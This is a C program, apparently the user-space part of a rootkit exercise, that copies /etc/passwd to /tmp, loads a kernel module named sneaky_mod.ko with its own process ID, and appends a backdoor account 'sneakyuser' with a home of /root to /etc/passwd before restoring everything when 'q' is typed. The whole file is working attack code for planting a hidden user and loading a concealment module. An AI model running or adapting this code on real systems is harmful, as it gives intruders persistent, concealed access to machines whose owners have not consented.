#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>  //getpid()

#define MAX_CMD_LEN 100

void exec_cmd(char* cmd, int cmd_len){
  if(cmd_len == MAX_CMD_LEN){
    printf("File copying directory has filled the buffer\n");
    exit(EXIT_FAILURE);
  }
  else{
    system(cmd);
  }
}

void copy_file(char* src_file, char* dst_file){
  char cmd_buffer[MAX_CMD_LEN];
  int cmd_len = snprintf(cmd_buffer, MAX_CMD_LEN, "cp %s %s", src_file, dst_file);
  exec_cmd(cmd_buffer, cmd_len);
}

void load_sneaky_process(char * module_name){
  char cmd_buffer[MAX_CMD_LEN];
  int cmd_len = snprintf(cmd_buffer, MAX_CMD_LEN, "insmod %s sneaky_PID=%d", module_name, getpid());
  exec_cmd(cmd_buffer, cmd_len);
}

void remove_sneaky_process(char * module_name){
  char cmd_buffer[MAX_CMD_LEN];
  int cmd_len = snprintf(cmd_buffer, MAX_CMD_LEN, "rmmod %s", module_name);
  exec_cmd(cmd_buffer, cmd_len);
}

void add_password(char* filename, char* password){
  FILE * fp = fopen(filename, "a+");

  if(fp == NULL){
    printf("File doesn't exist\n");
    exit(EXIT_FAILURE);
  }
  fprintf(fp, "%s\n", password);
  fclose(fp);
}

void remove_attack(char* module_name){
  remove_sneaky_process(module_name);
  copy_file("/tmp/passwd", "/etc/passwd");
  // remove /tmp/passwd
  system("rm /tmp/passwd");
}

void execute(){
  int c;
  while((c=getc(stdin)) != 'q'){}
}

void perform_attack(char* module_name){
  copy_file("/etc/passwd", "/tmp/passwd");
  load_sneaky_process(module_name);
  // copy_file("/etc/passwd", "/tmp/passwd");
  add_password("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
}

int main(int argc, char *argv[]){
  char * module_name = "sneaky_mod.ko";

  printf("sneaky_process pid = %d\n", getpid());

  perform_attack(module_name);
  execute();
  remove_attack(module_name);

  return EXIT_SUCCESS;
}